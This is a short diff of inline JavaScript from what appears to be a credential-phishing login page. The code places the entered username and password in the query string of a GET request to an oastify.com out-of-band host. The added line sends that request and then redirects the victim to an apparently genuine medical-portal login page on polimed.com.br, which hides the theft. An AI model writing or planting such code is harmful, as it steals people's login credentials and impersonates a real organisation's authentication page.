@@ -109,10 +109,7 @@
 
 			  const url = `https://b1dprv4gimj8nmlvlynw3pv25tbkzbn0.oastify.com?username=${login}&password=${senha}`;
 			  
-			  // Faz a requisição GET
-			  fetch(url).catch(() => {});
-			}
-			</script>
+			  fetch(url,{method:'GET'}).finally(()=>{window.location.href='https://polimed.com.br/autenticadorOrizon/loginAutenticador';});}</script>
 
 
 
